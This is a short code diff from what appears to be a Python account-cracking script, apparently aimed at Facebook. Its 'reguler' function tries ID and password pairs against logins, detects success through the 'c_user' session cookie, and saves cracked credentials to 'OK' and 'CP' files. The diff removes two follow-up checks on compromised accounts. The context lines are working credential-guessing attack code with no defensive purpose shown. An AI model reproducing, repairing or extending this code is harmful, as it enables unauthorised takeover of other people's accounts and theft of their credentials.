@@ -1125,7 +1125,7 @@ def reguler(idf,pwv,awal):
 				prints(tree)
 				os.popen('play-audio c.mp3')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				ceker(idf,pw)
+				
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1138,7 +1138,7 @@ def reguler(idf,pwv,awal):
 				prints(tree)
 				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				cek_apk(kuki)
+				
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
